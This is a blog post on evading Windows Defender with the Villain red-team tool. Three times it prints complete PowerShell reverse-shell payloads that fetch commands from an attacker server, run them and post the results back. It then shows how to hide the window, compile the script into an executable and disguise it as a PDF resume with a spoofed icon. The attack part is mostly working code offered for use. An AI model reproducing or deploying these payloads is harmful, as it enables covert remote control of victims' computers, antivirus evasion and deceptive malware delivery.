---
title: "Obfuscation with Villain"
date: 2022-12-14T11:45:01+08:00
---

[Home](/)

<h1 style="line-height: 1.0;">Windows Defender Bypass with Villain and Obfuscation (14/12/2022)</h1>
<br/>


<center><img src="/binaryspiders.jpg" alt="binary spiders"></center>
<p align="justify">
Windows Defender is a signature based antimalware system. This means that it checks programs against a library of previously identified malware to locate malicious software. Because of this, attackers can find ways to bypass Windows Defender by either creating new payloads or encoding/obfuscating existing payloads beyond recognition.

<br/><br/>

# Villain

## [Click here to watch it in action](https://youtu.be/Dzu2-AV6Hkc)

Note: I'd appreciate it if you're going to try this out, please turn off Windows Defender's automatic sample submission. 

[Villain](https://github.com/t3l3machus/Villain) by t3l3machus is an evolved version of his previous project [HoaxShell](https://github.com/t3l3machus/hoaxshell). HoaxShell managed to avoid detection for a period of time because it used http traffic for communication between the host and the remote computer and it creates a unique payload for every use by generating random values for session IDs. This means that every payload is single use only.

Villain inherits the way HoaxShell works but changes the implementation of powershell. Compared to HoaxShell, Villain is more fully suited towards red team usage due to its capability to catch and maintain multiple reverse shell connections at the same time. It also supports obfuscation and as well as payload encoding. Much like HoaxShell, Villain's payloads went undetected by Windows Defender for a period of time until they got fingerprinted.

<br/>

# Obfuscation

t3l3machus released a guide on how to manually obfuscate Villain's payloads in his video titled [Bypass signature-based detection with Villain](https://www.youtube.com/watch?v=FVbdZSGkzhs). In the video, he explained and presented many general ways to obfuscate powershsudoell backdoors. Manual obfuscation is done using the payload generated using:

<b>generate os=windows lhost=[IP]</b>

<center><img src="/villainshell.png" width="130%" height="200% alt="villain payload"></center>

The resulting payload would look something like this: 

<b>Start-Process $PSHOME\powershell.exe -ArgumentList {$s='[Server IP]:8080';$i='57100f54-99fd6e91-29c7d520';$p='http://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/57100f54/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/99fd6e91 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/29c7d520 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}} -WindowStyle Hidden</b>

In his video, he managed to bypass Windows Defender by changing the position of the $p variable from the end to the start as shown:

<b>Start-Process $PSHOME\powershell.exe -ArgumentList {$p='http://';$s='[Server IP]:8080';$i='57100f54-99fd6e91-29c7d520';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/57100f54/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/99fd6e91 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/29c7d520 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}} -WindowStyle Hidden</b>

During the time of writing, this powershell payload should execute without any issues. 

I noticed that t3l3machus added "Start-Process" and "-WindowStyle Hidden" to run the payload in the background. However, this does not close the powershell window if one opened. We are able to start the process as a job using "Start-Job -ScriptBlock". And then, we can concatenate "PowerShell -WindowStyle hidden ;" to the end of the script to close the powershell window totally:

<b>Start-Job -ScriptBlock{Start-Process $PSHOME\powershell.exe -ArgumentList {$p='http://';$s='[Server IP]:8080';$i='57100f54-99fd6e91-29c7d520';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/57100f54/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/99fd6e91 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/29c7d520 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}} -WindowStyle Hidden}; PowerShell -WindowStyle hidden ; </b>

Finally, we can package the ps1 script into an exe for a less suspicious look using the [ps2exe](https://github.com/MScholtes/PS2EXE) powershell tool:

<b>ps2exe .\source.ps1 .\target.exe</b>

We can make the executable less suspicious by spoofing its icons and extension to mimic something less suspicious like a pdf.

<center><img src="/fakeresume.png" width="30%" height="30% alt="resume exe"></center>

I did this using [maskedkitty](https://github.com/AHXR/maskedkitty) by [AXHR](https://github.com/AHXR). I named the file "resume.pdf". The full name of the file with the file extension included would be "resume.pdf.exe" so its not 100% convincing. 

With this, we have finished the creation of our payload. I expect this method of obfuscation with Villain's payloads to be fingerprinted and detected by Windows Defender sometime in the future but I hope everyone can enjoy this method while it lasts (legally of course).
</p>